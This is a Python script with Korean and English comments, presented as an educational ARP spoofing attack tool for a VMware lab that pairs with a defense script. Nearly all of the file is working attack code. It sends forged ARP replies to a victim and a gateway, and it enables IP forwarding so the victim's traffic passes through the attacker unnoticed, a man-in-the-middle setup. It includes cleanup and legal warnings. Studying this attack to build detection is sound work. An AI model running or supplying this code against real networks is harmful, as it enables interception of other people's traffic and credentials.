#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ARP 스푸핑 공격 실습 도구 (Ubuntu 전용 · 교육용)
ARP spoofing attack lab tool (Ubuntu only · for education)

[이 코드의 목적]
  방어 도구(arp_guard.py)가 "무엇을" 탐지하고 막는지 눈으로 보여주기 위한
  공격자 역할 코드입니다. 피해자 PC에게 "내가 게이트웨이야"라는 거짓 ARP 응답을
  반복해서 보내, 피해자의 통신이 공격자 PC를 거쳐 가도록(중간자, MitM) 만듭니다.

[Purpose of this code]
  This is the attacker-side code that shows WHAT the defense tool (arp_guard.py)
  detects and blocks. It repeatedly sends the victim PC fake ARP replies saying
  "I am the gateway", so the victim's traffic flows through the attacker PC
  (man-in-the-middle, MitM).

────────────────────────────────────────────────────────────────────────
  ⚠ 반드시 읽어 주세요 / READ THIS FIRST
  · 본인 소유의 VMware 가상머신끼리(NAT 네트워크) 에서만 실행하세요.
  · 학교·카페 등 공용 와이파이, 또는 남의 기기를 대상으로 실행하면 불법입니다.
  · Run this ONLY between your own VMware VMs (NAT network).
  · Using it on public Wi-Fi or on someone else's device is illegal.
────────────────────────────────────────────────────────────────────────

[설치] 공격자 VM에만 Scapy가 필요합니다 (피해자 VM에는 필요 없음):
  sudo apt install -y python3-scapy
  (또는) pip install scapy

[사용법]
  sudo python3 arp_attack.py -t 피해자IP -g 게이트웨이IP
  예: sudo python3 arp_attack.py -t 192.168.52.130 -g 192.168.52.2
  종료: Ctrl + C  (종료하면 피해자의 ARP 표를 자동으로 원래대로 복구합니다)
"""

import argparse
import os
import sys
import time

# Scapy가 없으면 친절한 안내를 보여주고 종료합니다.
# If Scapy is missing, show a friendly message and exit.
try:
    from scapy.all import ARP, Ether, srp, send, conf
except ImportError:
    sys.exit("Scapy가 설치되어 있지 않습니다. 아래로 설치하세요:\n"
             "  sudo apt install -y python3-scapy")

SEND_INTERVAL = 2   # 거짓 ARP를 몇 초마다 보낼지 / how often to send fake ARP, in seconds


def need_root():
    """관리자 권한(sudo)으로 실행했는지 확인합니다. ARP 패킷을 보내려면 필요합니다.
    Check for admin rights (sudo); required to send ARP packets."""
    if os.geteuid() != 0:
        sys.exit("관리자 권한이 필요합니다. 명령 앞에 sudo 를 붙여 다시 실행하세요.")


def get_mac(ip):
    """해당 IP의 진짜 MAC 주소를 물어봅니다(정상 ARP 요청). 못 찾으면 None.
    Ask for the real MAC address of an IP (normal ARP request). None if not found."""
    # 브로드캐스트로 "이 IP 쓰는 사람 누구?"를 묻고, 돌아온 응답에서 MAC을 읽습니다.
    # Broadcast "who has this IP?" and read the MAC from the reply.
    answered, _ = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
        timeout=3, retry=2, verbose=False)
    for _, reply in answered:
        return reply.hwsrc
    return None


def spoof(target_ip, target_mac, spoof_ip):
    """피해자에게 'spoof_ip(=게이트웨이)의 주인은 나(공격자)다'라는 거짓 ARP를 보냅니다.
    Tell the victim a lie: 'the owner of spoof_ip (the gateway) is me (attacker)'.

    hwsrc를 비워 두면 Scapy가 공격자 자신의 MAC을 자동으로 넣습니다.
    Leaving hwsrc empty makes Scapy fill in the attacker's own MAC automatically."""
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False)


def restore(target_ip, target_mac, source_ip, source_mac):
    """피해자의 ARP 표를 '진짜' MAC으로 되돌려, 실습 후 네트워크를 정상화합니다.
    Restore the victim's ARP table to the REAL MAC, so the network works after the lab."""
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac,
                 psrc=source_ip, hwsrc=source_mac)
    send(packet, count=5, verbose=False)   # 확실히 전달되도록 5번 보냄 / send 5x to be sure


def enable_ip_forward(on):
    """IP 포워딩을 켜거나 끕니다.
    켜면 피해자 통신이 공격자를 거쳐 그대로 게이트웨이로 전달되어,
    피해자는 인터넷이 끊기지 않고(눈치채기 어려움) 공격자는 중간에서 관찰할 수 있습니다.

    Turn IP forwarding on or off. When on, the victim's traffic passes through the
    attacker to the gateway, so the victim's internet keeps working (harder to notice)
    while the attacker sits in the middle."""
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("1\n" if on else "0\n")
    except OSError:
        print("※ IP 포워딩 설정에 실패했습니다. 피해자 인터넷이 끊길 수 있습니다.")


def main():
    parser = argparse.ArgumentParser(description="ARP 스푸핑 공격 실습 도구 (교육용)")
    parser.add_argument("-t", "--target", required=True, help="피해자 IP (예: 192.168.52.130)")
    parser.add_argument("-g", "--gateway", required=True, help="게이트웨이 IP (예: 192.168.52.2)")
    args = parser.parse_args()

    need_root()

    print("=" * 62)
    print(" ARP 스푸핑 공격 실습  (교육용 · 본인 VM에서만)")
    print(f"  피해자 IP   : {args.target}")
    print(f"  게이트웨이  : {args.gateway}")
    print("=" * 62)

    # 1) 두 대상의 '진짜' MAC을 먼저 알아 둡니다. (끝나고 복구할 때 필요)
    #    First learn the REAL MACs of both, needed to restore later.
    print("대상들의 진짜 MAC 주소를 확인하는 중...")
    target_mac = get_mac(args.target)
    gateway_mac = get_mac(args.gateway)

    if not target_mac or not gateway_mac:
        missing = args.target if not target_mac else args.gateway
        sys.exit(f"{missing} 의 MAC을 찾지 못했습니다. "
                 f"그 VM이 켜져 있고 같은 NAT 네트워크인지 확인하세요.")

    print(f"  피해자 MAC   : {target_mac}")
    print(f"  게이트웨이 MAC: {gateway_mac}")

    # 2) 중간자가 되기 위해 IP 포워딩을 켭니다.
    #    Turn on IP forwarding to become the man in the middle.
    enable_ip_forward(True)
    print("\nIP 포워딩 켜짐. 공격 시작! (중단: Ctrl + C)\n")
    print("  이제 피해자 VM에서 arp_guard.py 를 실행하면 경고가 떠야 합니다.")
    print("  공격자가 보는 피해자 트래픽은 Wireshark 나 tcpdump 로 관찰하세요.\n")

    sent = 0
    try:
        while True:
            # 피해자에게: '게이트웨이 = 나'  /  To victim: 'gateway = me'
            spoof(args.target, target_mac, args.gateway)
            # 게이트웨이에게: '피해자 = 나' (양방향이라야 응답 트래픽도 가로챔)
            # To gateway: 'victim = me' (both directions, to also catch reply traffic)
            spoof(args.gateway, gateway_mac, args.target)
            sent += 2
            print(f"\r  거짓 ARP 패킷 보낸 횟수: {sent}", end="", flush=True)
            time.sleep(SEND_INTERVAL)
    except KeyboardInterrupt:
        # 3) 종료 시 반드시 복구: 안 하면 피해자 인터넷이 한동안 끊깁니다.
        #    Always restore on exit; otherwise the victim loses internet for a while.
        print("\n\n공격 중단. 피해자 ARP 표를 원래대로 복구하는 중...")
        restore(args.target, target_mac, args.gateway, gateway_mac)
        restore(args.gateway, gateway_mac, args.target, target_mac)
        enable_ip_forward(False)
        print("복구 완료. 피해자 네트워크가 정상으로 돌아왔습니다.")


if __name__ == "__main__":
    main()
